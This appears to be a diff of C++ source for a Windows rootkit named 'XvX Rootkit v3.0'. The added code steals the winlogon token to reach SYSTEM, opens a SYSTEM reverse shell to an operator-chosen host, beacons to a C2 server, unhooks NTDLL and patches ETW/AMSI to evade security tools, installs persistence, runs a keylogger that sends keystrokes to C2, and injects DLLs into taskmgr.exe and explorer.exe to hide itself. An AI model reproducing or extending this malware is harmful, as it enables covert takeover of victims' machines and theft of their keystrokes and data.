-                                    {
-                                        result = L"SUCCESS|Now running as NT AUTHORITY\\SYSTEM";
-                                    }
-                                    else
-                                    {
-                                        result = L"ERROR|Failed to impersonate SYSTEM token";
-                                    }
-                                }
-                                else
-                                {
-                                    result = L"ERROR|Failed to duplicate token";
-                                }
-                                CloseHandle(hToken);
-                            }
-                            else
+                        if (fnSnapshot)
+                        {
+                            HANDLE hSnapshot = fnSnapshot(TH32CS_SNAPPROCESS, 0);
+                            if (hSnapshot != INVALID_HANDLE_VALUE)
                             {
-                                result = L"ERROR|Failed to open winlogon token";
+                                typedef BOOL(WINAPI * pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
+                                typedef BOOL(WINAPI * pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
+                                auto fnFirst = (pProcess32FirstW)APIResolver::ResolveAPI(APIHash::Process32FirstW);
+                                auto fnNext = (pProcess32NextW)APIResolver::ResolveAPI(APIHash::Process32NextW);
+
+                                PROCESSENTRY32W pe = {sizeof(pe)};
+                                if (fnFirst && fnNext && fnFirst(hSnapshot, &pe))
+                                {
+                                    do
+                                    {
+                                        if (wcscmp(pe.szExeFile, L"winlogon.exe") == 0)
+                                        {
+                                            winlogonPID = pe.th32ProcessID;
+                                            break;
+                                        }
+                                    } while (fnNext(hSnapshot, &pe));
+                                }
+                                CloseHandle(hSnapshot);
                             }
-                            CloseHandle(hWinlogon);
+                        }
+
+                        if (winlogonPID == 0)
+                        {
+                            result = L"ERROR|winlogon.exe not found";
                         }
                         else
                         {
-                            result = L"ERROR|Failed to open winlogon process (need admin rights)";
+                            // Open winlogon process with NtOpenProcess
+                            struct
+                            {
+                                PVOID UniqueProcess;
+                                PVOID UniqueThread;
+                            } clientId;
+                            clientId.UniqueProcess = (PVOID)(ULONG_PTR)winlogonPID;
+                            clientId.UniqueThread = NULL;
+
+                            struct
+                            {
+                                ULONG Length;
+                                HANDLE RootDirectory;
+                                PVOID ObjectName;
+                                ULONG Attributes;
+                                PVOID SecurityDescriptor;
+                                PVOID SecurityQualityOfService;
+                            } objAttr = {0};
+                            objAttr.Length = sizeof(objAttr);
+
+                            HANDLE hWinlogon = NULL;
+                            NTSTATUS ntStatus = IndirectSyscalls::SysNtOpenProcess(&hWinlogon, PROCESS_QUERY_INFORMATION,
+                                                                                   &objAttr, &clientId);
+
+                            if (NT_SUCCESS(ntStatus) && hWinlogon)
+                            {
+                                HANDLE hToken = NULL, hNewToken = NULL;
+                                typedef BOOL(WINAPI * pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
+                                                                         SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
+                                auto fnDuplicate = (pDuplicateTokenEx)APIResolver::ResolveAPI(APIHash::DuplicateTokenEx);
+
+                                if (fnOpenToken && fnOpenToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))
+                                {
+                                    if (fnDuplicate && fnDuplicate(hToken, MAXIMUM_ALLOWED, NULL,
+                                                                   SecurityImpersonation, TokenPrimary, &hNewToken))
+                                    {
+                                        if (g_systemToken != NULL && g_systemToken != INVALID_HANDLE_VALUE)
+                                            CloseHandle(g_systemToken);
+                                        g_systemToken = hNewToken;
+
+                                        // Impersonate SYSTEM
+                                        if (ImpersonateLoggedOnUser(g_systemToken))
+                                        {
+                                            result = L"SUCCESS|Escalated to SYSTEM via token stealing";
+                                        }
+                                        else
+                                        {
+                                            result = L"ERROR|Failed to impersonate SYSTEM token";
+                                        }
+                                    }
+                                    else
+                                    {
+                                        result = L"ERROR|Failed to duplicate token";
+                                    }
+                                    CloseHandle(hToken);
+                                }
+                                else
+                                {
+                                    result = L"ERROR|Failed to open winlogon token";
+                                }
+                                CloseHandle(hWinlogon);
+                            }
+                            else
+                            {
+                                result = L"ERROR|Failed to open winlogon process (NTSTATUS: " + to_wstring(ntStatus) + L")";
+                            }
                         }
                     }
                 }
-                // Interactive SYSTEM shell
-                else if (cmd == L"shell" && args.find(L"system ") == 0)
+                else if (cmd == L"revshell_system")
                 {
-                    // Extract the real command after "system "
-                    wstring realCmd = args.substr(7); // Skip "system "
-
-                    // Execute cmd.exe with the current SYSTEM token
-                    wchar_t buffer[65536];
-                    FILE *pipe = _wpopen((L"cmd.exe /c " + realCmd).c_str(), L"r");
-                    if (pipe)
+                    // Launch TCP reverse shell with SYSTEM token
+                    if (g_systemToken == NULL || g_systemToken == INVALID_HANDLE_VALUE)
                     {
-                        wstring output;
-                        while (fgetws(buffer, 65536, pipe))
-                        {
-                            output += buffer;
-                        }
-                        _pclose(pipe);
-
-                        result = output.empty() ? L"[Command executed - no output]" : output;
+                        result = L"ERROR|No SYSTEM token available. Run 'privesc' first.";
                     }
                     else
                     {
-                        result = L"ERROR|Failed to create shell";
+                        size_t colonPos = args.find(L':');
+                        if (colonPos == wstring::npos)
+                        {
+                            result = L"ERROR|Invalid format. Use: host:port";
+                        }
+                        else
+                        {
+                            wstring hostW = args.substr(0, colonPos);
+                            wstring portW = args.substr(colonPos + 1);
+
+                            string host(hostW.begin(), hostW.end());
+                            int port = _wtoi(portW.c_str());
+
+                            if (port <= 0 || port > 65535)
+                            {
+                                result = L"ERROR|Invalid port number";
+                            }
+                            else
+                            {
+                                result = L"SUCCESS|Launching SYSTEM reverse shell to " + hostW + L":" + portW;
+                                c2->sendResult(cmd, L"OK", result);
+
+                                // Launch in separate thread to not block C2 beacon
+                                ReverseShellParams *params = new ReverseShellParams();
+                                strncpy(params->host, host.c_str(), sizeof(params->host) - 1);
+                                params->host[sizeof(params->host) - 1] = '\0';
+                                params->port = port;
+                                CreateThread(NULL, 0, ReverseShellThread, params, 0, NULL);
+
+                                continue;
+                            }
+                        }
                     }
                 }
-                // Stop interactive reverse shell
+                else if (cmd == L"revshell_start")
+                {
+                    if (g_shell.active)
+                    {
+                        result = L"SUCCESS|Shell already active";
+                    }
+                    else
+                    {
+                        result = L"SUCCESS|Starting shell...";
+                        c2->sendResult(cmd, L"OK", result);
+                        try
+                        {
+                            if (!StartInteractiveShell())
+                            {
+                                c2->sendResult(cmd, L"ERROR", L"CreateProcess failed");
+                            }
+                        }
+                        catch (...)
+                        {
+                            c2->sendResult(cmd, L"ERROR", L"Exception during shell start");
+                        }
+                        continue;
+                    }
+                }
                 else if (cmd == L"revshell_stop")
                 {
                     if (!g_shell.active)
@@ -792,114 +818,58 @@ DWORD WINAPI c2ModeThread(LPVOID lpParam)
                     else
                     {
                         EnterCriticalSection(&g_shell.cs);
-
-                        // Close handles
                         if (g_shell.hInputWrite)
-                        {
                             CloseHandle(g_shell.hInputWrite);
-                            g_shell.hInputWrite = NULL;
-                        }
                         if (g_shell.hOutputRead)
-                        {
                             CloseHandle(g_shell.hOutputRead);
-                            g_shell.hOutputRead = NULL;
-                        }
-
-                        // Terminate the cmd.exe process
                         if (g_shell.hProcess)
                         {
                             TerminateProcess(g_shell.hProcess, 0);
                             CloseHandle(g_shell.hProcess);
-                            g_shell.hProcess = NULL;
                         }
                         if (g_shell.hThread)
-                        {
                             CloseHandle(g_shell.hThread);
-                            g_shell.hThread = NULL;
-                        }
-
                         g_shell.active = false;
                         g_shell.outputBuffer.clear();
-
                         LeaveCriticalSection(&g_shell.cs);
-
                         result = L"SUCCESS|Shell stopped";
                     }
                 }
-                // Start interactive reverse shell
-                else if (cmd == L"revshell_start")
-                {
-                    // Check WITHOUT starting if shell already active
-                    if (g_shell.active)
-                    {
-                        result = L"SUCCESS|Shell already active";
-                    }
-                    else
-                    {
-                        // Send SUCCESS IMMEDIATELY before starting the shell
-                        result = L"SUCCESS|Starting shell...";
-                        c2->sendResult(cmd, L"OK", result);
-
-                        // NOW start the shell (in the background)
-                        try
-                        {
-                            BOOL shellStarted = StartInteractiveShell();
-                            if (!shellStarted)
-                            {
-                                // If failed, send a second error result
-                                c2->sendResult(cmd, L"ERROR", L"CreateProcess failed");
-                            }
-                        }
-                        catch (...)
-                        {
-                            c2->sendResult(cmd, L"ERROR", L"Exception during shell start");
-                        }
-                        continue; // Skip the normal sendResult (already sent)
-                    }
-                }
-                // Send command to reverse shell
                 else if (cmd == L"revshell_input")
                 {
                     if (g_shell.active)
                     {
                         WriteShellInput(args);
-
                         wstring output;
-
-                        // Phase 1: Rapid polling for quick commands (whoami, hostname, etc.)
-                        // Starts immediately after WriteShellInput - no initial delay
                         bool gotOutput = false;
+
                         for (int i = 0; i < 40; i++)
                         {
-                            Sleep(50); // 50ms between reads = total 2 seconds max
+                            JitterSleep(50);
                             wstring chunk = ReadShellOutput();
                             if (!chunk.empty())
                             {
                                 output += chunk;
                                 gotOutput = true;
-                                // Continue reading for 300ms after first output
-                                Sleep(100);
+                                JitterSleep(100);
                                 output += ReadShellOutput();
-                                Sleep(100);
+                                JitterSleep(100);
                                 output += ReadShellOutput();
-                                Sleep(100);
+                                JitterSleep(100);
                                 output += ReadShellOutput();
                                 break;
                             }
                         }
 
-                        // Phase 2: If no output, command may be slow, progressive wait
                         if (!gotOutput)
                         {
-                            Sleep(500);
+                            JitterSleep(500);
                             output = ReadShellOutput();
-
                             if (output.empty())
                             {
-                                // Last attempt for very slow commands
                                 for (int i = 0; i < 5; i++)
                                 {
-                                    Sleep(200);
+                                    JitterSleep(200);
                                     wstring chunk = ReadShellOutput();
                                     if (!chunk.empty())
                                     {
@@ -910,8 +880,7 @@ DWORD WINAPI c2ModeThread(LPVOID lpParam)
                             }
                         }
 
-                        // Final read to capture remaining data
-                        Sleep(100);
+                        JitterSleep(100);
                         wstring final = ReadShellOutput();
                         if (!final.empty())
                             output += final;
@@ -923,22 +892,19 @@ DWORD WINAPI c2ModeThread(LPVOID lpParam)
                         result = L"ERROR|Shell not active - use revshell_start first";
                     }
                 }
-                // Retrieve output from reverse shell
                 else if (cmd == L"revshell_output")
                 {
                     if (g_shell.active)
                     {
                         wstring output;
-                        // Read in a loop for up to 2 seconds
                         for (int i = 0; i < 20; i++)
                         {
-                            Sleep(100);
+                            JitterSleep(100);
                             wstring chunk = ReadShellOutput();
                             if (!chunk.empty())
                             {
                                 output += chunk;
-                                // Wait for remaining output
-                                Sleep(200);
+                                JitterSleep(200);
                                 chunk = ReadShellOutput();
                                 if (!chunk.empty())
                                     output += chunk;
@@ -952,7 +918,6 @@ DWORD WINAPI c2ModeThread(LPVOID lpParam)
                         result = L"ERROR|Shell not active";
                     }
                 }
-                // Stop rootkit
                 else if (cmd == L"die")
                 {
                     c2->setActive(false);
@@ -963,152 +928,147 @@ DWORD WINAPI c2ModeThread(LPVOID lpParam)
                     result = L"ERROR|Unknown command: " + cmd;
                 }
 
-                // Send result to C2
                 c2->sendResult(cmd, L"OK", result);
             }
         }
         catch (...)
         {
-            // Exception caught -> do not crash the thread
-            // Beacon continues next cycle
         }
 
-        // Wait before next beacon
-        // Fast polling if shell active (1s), normal otherwise (60s)
         DWORD sleepTime = g_shell.active ? 1000 : c2->getBeaconInterval();
-        Sleep(sleepTime);
+        Evasion::ObfuscatedSleep(sleepTime);
     }
 
     return 0;
 }
 
-void initLocalConfig()
+// Main entry point - initialize da rootkit modules and C2 connection
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    // Default targets
-    agentVector.clear();
-    pathVector.clear();
-    registryVector.clear();
-
-    // Example: hide default payload
-    // agentVector.push_back(L"malware.exe");
-    // pathVector.push_back(L"C:\\Payloads");
-    // registryVector.push_back(L"BadKey");
-
-    // SSerialize to IPC
-    Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
-    Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
-    Serialitzator::serializeVectorWString(registryVector, L"registryMapped");
-}
-
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-                   LPSTR lpCmdLine, int nCmdShow)
-{
-
-    // Attempt UAC bypass if not admin
-    if (!UACBypass())
-    {
-        // Fallback, continue anyway (degraded mode without privesc)
-    }
-
-    // From here, we are admin (if the bypass worked)
-
-    // Initialize interactive shell
-    InitShell();
-
-    // Anti-VM and anti-debugging check
-    // DISABLED FOR TESTING ON VMs
-    /*
-    #ifndef _DEBUG
-    if (isDebuggerPresent_Check() || isRunningInVM()) {
-        return 1; // Exit silently if detected
-    }
-    #endif
-    */
-
-    // Allocate console ONLY in debug mode
-    #ifdef _DEBUG
+#ifdef _DEBUG
+    // Allocate console ONLY in debug builds
     AllocConsole();
     FILE *fp;
     freopen_s(&fp, "CONOUT$", "w", stdout);
     freopen_s(&fp, "CONOUT$", "w", stderr);
-    
-    wcout << L"\n========================================" << endl;
-    wcout << L"  XvX UM Rootkit v2.0 [HYBRID MODE]" << endl;
-    wcout << L"========================================\n" << endl;
-    #endif
+#else
+    // Production: Close any inherited console
+    FreeConsole();
+#endif
 
-    initLocalConfig();
-    
-    #ifdef _DEBUG
-    wcout << L"[+] Local configuration loaded" << endl;
-    #endif
+    LOG_DEBUG(L"========================================");
+    LOG_DEBUG(L"   XvX ROOTKIT v3.0 - STARTING");
+    LOG_DEBUG(L"========================================");
 
-    // Read C2 URL from file (optional)
-    wstring c2URL = L"https://127.0.0.1:8443";
-
-    // Get the path of the exe folder
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);
-    string exeDir(exePath);
-    size_t lastSlash = exeDir.find_last_of("\\/");
-    if (lastSlash != string::npos)
+    LOG_INFO(L"[1/8] Running evasion checks...");
+    if (!Evasion::RunEvasionChecks())
     {
-        exeDir = exeDir.substr(0, lastSlash + 1);
+        LOG_FAIL(L"Evasion checks failed - exiting");
+        return 0;
     }
-    string configPath = exeDir + "c2_config.txt";
+    LOG_SUCCESS(L"Evasion checks passed");
 
-    // Read ALL URLs from the file and try each until one works
-    vector<wstring> c2URLs;
-    ifstream configFile(configPath);
-    if (configFile.is_open())
+    LOG_INFO(L"[2/8] Unhooking NTDLL...");
+    UNHOOK_RESULT unhookResult;
+    if (NTDLLUnhooker::UnhookNTDLL(&unhookResult))
     {
-        string urlA;
-        while (getline(configFile, urlA))
-        {
-            // Clean the string (remove \r\n and invisible characters)
-            urlA.erase(std::remove_if(urlA.begin(), urlA.end(),
-                                      [](char c)
-                                      { return c == '\r' || c == '\n' || c == '\0'; }),
-                       urlA.end());
-
-            // Convert ASCII to wstring and add to the list
-            if (!urlA.empty())
-            {
-                try
-                {
-                    wstring url = wstring(urlA.begin(), urlA.end());
-                    c2URLs.push_back(url);
-                }
-                catch (...)
-                {
-                    // Ignore invalid lines
-                }
-            }
-        }
-        configFile.close();
-
-        #ifdef _DEBUG
-        if (!c2URLs.empty())
-        {
-            wcout << L"[*] " << c2URLs.size() << L" C2 URLs detected in config" << endl;
-        }
-        #endif
+        LOG_SUCCESS(L"NTDLL unhooked (EDR bypass active)");
     }
     else
     {
-        #ifdef _DEBUG
-        wcout << L"[*] No c2_config.txt, using default URL" << endl;
-        #endif
-        c2URLs.push_back(c2URL);
+        LOG_WARN(L"NTDLL unhooking failed, continuing anyway");
     }
 
-    // Use default URL if none configured
-    if (c2URLs.empty())
+    LOG_INFO(L"[3/8] Disabling telemetry (ETW/AMSI)...");
+    if (TelemetryBypass::DisableTelemetry())
     {
-        c2URLs.push_back(c2URL);
+        LOG_SUCCESS(L"Telemetry bypassed (ETW/AMSI patched)");
+    }
+    else
+    {
+        LOG_WARN(L"Telemetry bypass failed, continuing anyway");
     }
 
-    // Try each URL until one works
+    LOG_DEBUG(L"\n========================================");
+    LOG_DEBUG(L"  XvX Rootkit v3.0 - Active");
+    LOG_DEBUG(L"========================================\n");
+    LOG_INFO(L"[4/8] Starting rootkit initialization...");
+
+    try
+    {
+        LOG_INFO(L"[5/8] Getting executable path...");
+
+        WCHAR exePath[MAX_PATH];
+        GetModuleFileNameW(NULL, exePath, MAX_PATH);
+        wstring exePathW(exePath);
+
+        LOG_SUCCESS(wstring(L"Path: ") + exePathW);
+        LOG_INFO(L"[6/8] Initializing shell listener...");
+
+        InitShell();
+        LOG_SUCCESS(L"Shell initialized");
+        LOG_INFO(L"Installing persistence...");
+
+        Persistence::InstallPersistence(exePathW);
+        LOG_SUCCESS(L"Persistence installed");
+    }
+    catch (...)
+    {
+        LOG_ERROR(L"Exception caught during initialization!");
+#ifdef _DEBUG
+        system("pause");
+#endif
+        return 1;
+    }
+
+    wstring c2URL = L"http://127.0.0.1:8080"; // Default fallback, overridden by c2_config.txt
+    vector<wstring> c2URLs;
+
+    // Try to read c2_config.txt from executable directory
+    WCHAR exeDir[MAX_PATH];
+    GetModuleFileNameW(NULL, exeDir, MAX_PATH);
+    wstring exeDirW(exeDir);
+    size_t lastSlash = exeDirW.find_last_of(L"\\/");
+    if (lastSlash != wstring::npos)
+    {
+        exeDirW = exeDirW.substr(0, lastSlash + 1);
+    }
+    wstring configPathW = exeDirW + L"c2_config.txt";
+    string configPath(configPathW.begin(), configPathW.end());
+
+    ifstream configFile(configPath);
+    if (configFile.is_open())
+    {
+        string line;
+        while (getline(configFile, line))
+        {
+            if (line.empty() || line[0] == '#')
+                continue;
+            wstring url(line.begin(), line.end());
+            c2URLs.push_back(url);
+        }
+        configFile.close();
+
+#ifdef _DEBUG
+        wcout << L"[+] Loaded C2 config from: " << configPathW << endl;
+#ifdef _DEBUG
+        wcout << L"[+] Found " << c2URLs.size() << L" C2 URLs" << endl;
+#endif
+#endif
+    }
+    else
+    {
+#ifdef _DEBUG
+        wcout << L"[-] c2_config.txt not found: " << configPathW << endl;
+#ifdef _DEBUG
+        wcout << L"[*] Using default C2 URL" << endl;
+#endif
+#endif
+    }
+
+    if (c2URLs.empty())
+        c2URLs.push_back(c2URL);
+
     bool c2Available = false;
     C2Client *c2 = nullptr;
 
@@ -1120,17 +1080,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         if (c2Available)
         {
             c2URL = url;
-            #ifdef _DEBUG
+#ifdef _DEBUG
             wcout << L"[+] C2 available: " << c2URL << endl;
+#ifdef _DEBUG
             wcout << L"[+] Agent ID: " << c2->getAgentID() << endl;
-            #endif
+#endif
+#endif
             break;
         }
         else
         {
-            #ifdef _DEBUG
+#ifdef _DEBUG
             wcout << L"[-] Connection failed: " << url << endl;
-            #endif
+#endif
             delete c2;
             c2 = nullptr;
         }
@@ -1138,171 +1100,160 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     if (c2Available && c2)
     {
-        // Start C2 thread in the background
-        CreateThread(NULL, 0, c2ModeThread, (LPVOID)c2, 0, NULL);
-        #ifdef _DEBUG
-        wcout << L"[+] C2 mode active (beacon interval: " << c2->getBeaconInterval() / 1000 << L"s)" << endl;
-        #endif
-    }
-    else
-    {
-        #ifdef _DEBUG
-        wcout << L"[i] C2 unavailable - local mode only" << endl;
-        #endif
-    }
+        g_c2Client = c2;
 
-    // Parse command line arguments
-    int argc;
-    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+        // Start keylogger FIRST before C2 thread floods logs
+#ifdef _DEBUG
+        wcout << L"[7/8] Starting keylogger..." << endl;
+#endif
 
-    // Case 1: No arguments (first launch)
-    if (argc == 1)
-    {
-        #ifdef _DEBUG
-        wcout << L"[*] First launch detected" << endl;
-        #endif
-
-        // Initialize empty File Mapping Objects
-        vector<wstring> empty;
-        Serialitzator::serializeVectorWString(empty, L"agentMapped");
-        Serialitzator::serializeVectorWString(empty, L"pathMapped");
-        Serialitzator::serializeVectorWString(empty, L"registryMapped");
-        
-        #ifdef _DEBUG
-        wcout << L"[+] File Mapping Objects initialized" << endl;
-        #endif
-
-        // Inject DLLs into existing processes
-        char exePath[MAX_PATH];
-        GetModuleFileNameA(NULL, exePath, MAX_PATH);
-        string baseDir(exePath);
-        size_t pos = baseDir.find_last_of("\\");
-        baseDir = baseDir.substr(0, pos);
-
-        // Inject Hooks.dll if active
-        int taskmgrPID = getPIDbyProcName("taskmgr.exe");
-        if (taskmgrPID != 0)
+        try
         {
-            string dllPath = baseDir + "\\processHooks\\processHooks.dll";
-            if (injectDLL(dllPath, taskmgrPID))
-            {
-                #ifdef _DEBUG
-                wcout << L"[+] processHooks.dll injected into taskmgr.exe" << endl;
-                #endif
-            }
-        }
-
-        // Inject fileHooks.dll into explorer.exe
-        int explorerPID = getPIDbyProcName("explorer.exe");
-        if (explorerPID != 0)
-        {
-            string dllPath = baseDir + "\\fileHooks\\fileHooks.dll";
-            if (injectDLL(dllPath, explorerPID))
-            {
-                #ifdef _DEBUG
-                wcout << L"[+] fileHooks.dll injected into explorer.exe" << endl;
-                #endif
-            }
-        }
-
-        // Inject Hooks.dll if active
-        int regeditPID = getPIDbyProcName("regedit.exe");
-        if (regeditPID != 0)
-        {
-            string dllPath = baseDir + "\\registryHooks\\registryHooks.dll";
-            if (injectDLL(dllPath, regeditPID))
-            {
-                #ifdef _DEBUG
-                wcout << L"[+] registryHooks.dll injected into regedit.exe" << endl;
-                #endif
-            }
-        }
-
-        // Install persistence
-        addPersistence();
-
-        // Start keylogger if C2 is available
-        if (c2)
-        {
-            g_c2Client = c2;
             if (Keylogger::Start(OnKeylogData))
             {
-                #ifdef _DEBUG
-                wcout << L"[+] Keylogger active (WH_KEYBOARD_LL hook)" << endl;
-                #endif
+#ifdef _DEBUG
+                wcout << L"[OK] Keylogger started with C2 exfiltration" << endl;
+#endif
             }
             else
             {
-                #ifdef _DEBUG
-                wcout << L"[!] Failed to start keylogger" << endl;
-                #endif
+#ifdef _DEBUG
+                wcout << L"[FAIL] Keylogger::Start() returned false" << endl;
+#endif
             }
         }
-
-        #ifdef _DEBUG
-        wcout << L"\n[+] Rootkit active!" << endl;
-        wcout << L"[i] Demon mode - Rootkit running in background" << endl;
-        wcout << L"[i] C2 beacon every " << (c2 ? c2->getBeaconInterval() / 1000 : 60) << L"s" << endl;
-        #endif
-
-        LocalFree(argv);
-
-        // Message loop to keep keyboard hook active
-        MSG msg;
-        while (GetMessage(&msg, NULL, 0, 0))
+        catch (...)
         {
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
+#ifdef _DEBUG
+            wcout << L"[EXCEPTION] Keylogger error" << endl;
+#endif
         }
 
-        // Cleanup on exit
-        Keylogger::Stop();
-        return 0;
-    }
+        JitterSleep(500);
 
-    // Cas 2: Commande "help"
-    if (argc >= 2 && wcscmp(argv[1], L"help") == 0)
-    {
-        showHelp();
-        LocalFree(argv);
-        Sleep(3000);
-        return 0;
-    }
+        // Start C2 thread AFTER keylogger
+#ifdef _DEBUG
+        wcout << L"[8/8] Starting C2 communication thread..." << endl;
+#endif
 
-    // Case 3: Commands with 3 or more arguments (type action [value])
-    if (argc >= 3)
-    {
-        wstring type = argv[1];   // process / path / registry
-        wstring action = argv[2]; // hide / show
-        wstring value;
-
-        // Hide commands require a value
-        if (action == L"hide")
+        HANDLE hC2Thread = CreateThread(NULL, 0, c2ModeThread, (LPVOID)c2, 0, NULL);
+        if (hC2Thread)
         {
-            if (argc < 4)
+#ifdef _DEBUG
+            wcout << L"[+] C2 thread started" << endl;
+#ifdef _DEBUG
+            wcout << L"[+] Beacon interval: " << c2->getBeaconInterval() / 1000 << L"s" << endl;
+#endif
+#endif
+        }
+    }
+    else
+    {
+#ifdef _DEBUG
+        wcout << L"[!] C2 unavailable - running in standalone mode" << endl;
+#ifdef _DEBUG
+        wcout << L"[i] Rootkit features available without C2:" << endl;
+#endif
+#ifdef _DEBUG
+        wcout << L"    - NTDLL unhooking (active - anti-EDR)" << endl;
+#endif
+#ifdef _DEBUG
+        wcout << L"    - ETW/AMSI bypass (active - anti-telemetry)" << endl;
+#endif
+#ifdef _DEBUG
+        wcout << L"    - Process hiding (processHooks.dll)" << endl;
+#endif
+#ifdef _DEBUG
+        wcout << L"    - File hiding (fileHooks.dll)" << endl;
+#endif
+#ifdef _DEBUG
+        wcout << L"    - Registry hiding (registryHooks.dll)" << endl;
+#endif
+#endif
+    }
+
+#ifdef _DEBUG
+    wcout << L"\n[+] Rootkit active!" << endl;
+#ifdef _DEBUG
+    wcout << L"[i] Daemon mode - Running in background" << endl;
+#endif
+#ifdef _DEBUG
+    wcout << L"[*] Activating stealth mode..." << endl;
+#endif
+#endif
+
+    // Hide rootkit process from Task Manager
+    wstring myProcess = L"r00tkit.exe";
+    vector<wstring> agentVector;
+    try
+    {
+        agentVector = deserializeWStringVector(L"agentMapped");
+    }
+    catch (...)
+    {
+        agentVector.clear();
+    }
+    agentVector.push_back(myProcess);
+    Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
+
+    DWORD taskmgrPID = getPIDbyProcName("taskmgr.exe");
+    if (taskmgrPID != 0 && !isDLLLoaded(taskmgrPID, L"processHooks.dll"))
+    {
+        wchar_t myDllPath[MAX_PATH];
+        GetModuleFileNameW(NULL, myDllPath, MAX_PATH);
+        wstring pathW(myDllPath);
+        size_t pos = pathW.find_last_of(L"\\");
+        if (pos != wstring::npos)
+        {
+            pathW = pathW.substr(0, pos) + L"\\processHooks.dll";
+            if (injectDLL(pathW.c_str(), taskmgrPID))
             {
-                wcout << L"[!] Error: 'hide' command requires a value" << endl;
-                wcout << L"[i] Example: rootkit.exe process hide malware.exe" << endl;
-                LocalFree(argv);
-                Sleep(2000);
-                return 1;
+#ifdef _DEBUG
+                wcout << L"[+] Injected processHooks.dll into taskmgr.exe (PID " << taskmgrPID << L")" << endl;
+#endif
             }
-            value = argv[3];
         }
-
-        // Process the command
-        processCommand(type, action, value);
-
-        LocalFree(argv);
-        wcout << L"\n[+] Command executed successfully" << endl;
-        Sleep(2000);
-        return 0;
     }
 
-    // Case 4: Invalid arguments
-    wcout << L"[!] Invalid command" << endl;
-    wcout << L"[i] Use 'rootkit.exe help' to see the commands" << endl;
-    LocalFree(argv);
-    Sleep(2000);
-    return 1;
+    // Hide rootkit files from Explorer
+    vector<wstring> pathVector;
+    try
+    {
+        pathVector = deserializeWStringVector(L"pathMapped");
+    }
+    catch (...)
+    {
+        pathVector.clear();
+    }
+
+    wstring rootkitDir = exeDirW;
+    pathVector.push_back(rootkitDir + L"r00tkit.exe");
+    pathVector.push_back(rootkitDir + L"processHooks.dll");
+    pathVector.push_back(rootkitDir + L"fileHooks.dll");
+    pathVector.push_back(rootkitDir + L"registryHooks.dll");
+    Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
+
+    DWORD explorerPID = getPIDbyProcName("explorer.exe");
+    if (explorerPID != 0 && !isDLLLoaded(explorerPID, L"fileHooks.dll"))
+    {
+        wstring fileDllPath = rootkitDir + L"fileHooks.dll";
+        if (injectDLL(fileDllPath.c_str(), explorerPID))
+        {
+#ifdef _DEBUG
+            wcout << L"[+] Injected fileHooks.dll into explorer.exe (PID " << explorerPID << L")" << endl;
+#endif
+        }
+    }
+
+#ifdef _DEBUG
+    wcout << L"[OK] Stealth mode active (process + files hidden)" << endl;
+#endif
+
+    while (c2Available && c2 && c2->isRunning())
+    {
+        JitterSleep(1000);
+    }
+
+    Keylogger::Stop();
+    return 0;
 }
